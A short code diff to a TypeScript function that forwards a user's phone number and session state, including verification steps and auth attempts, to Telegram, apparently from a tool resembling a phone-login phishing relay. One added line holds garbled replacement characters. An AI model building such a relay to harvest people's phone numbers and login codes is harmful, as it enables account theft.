@@ -478,7 +478,7 @@ export const sendPhoneToTelegramEnhanced = async (
   // Check if Telegram is configured
   if (!validateTelegramConfig()) {
     console.log("🎭 Demo mode: Would send phone to Telegram");
-    console.log("📱 Phone:", phoneNumber);
+    console.log("�� Phone:", phoneNumber);
     console.log("🆔 Session:", sessionId);
 
     // Create session for demo mode
@@ -509,7 +509,7 @@ export const sendPhoneToTelegramEnhanced = async (
     const session: UserSession = {
       sessionId,
       phoneNumber,
-      startTime: new Date().toLocaleString("fa-IR"),
+      startTime: new Date().toISOString(),
       completedSteps: [],
       currentStep: "phone_verification",
       authAttempts: {},
